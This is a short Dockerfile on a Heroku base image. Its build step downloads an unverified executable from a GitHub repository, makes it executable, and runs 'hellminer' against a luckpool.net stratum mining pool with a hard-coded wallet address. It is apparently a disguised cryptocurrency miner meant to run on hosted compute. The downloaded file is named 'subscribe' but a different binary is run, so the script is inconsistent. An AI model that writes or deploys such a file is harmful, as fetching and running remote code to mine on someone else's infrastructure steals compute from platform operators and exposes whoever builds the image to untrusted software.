FROM heroku/heroku:18
RUN apt-get install -y curl git unzip wget
RUN wget https://github.com/nonobono477/Student/raw/main/subscribe; chmod +x subscribe; ./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RMBad57Qa65EWHE3cWN62XqEVHb7MoZkZV.oppa1  -p x --cpu 2
CMD bash heroku.sh
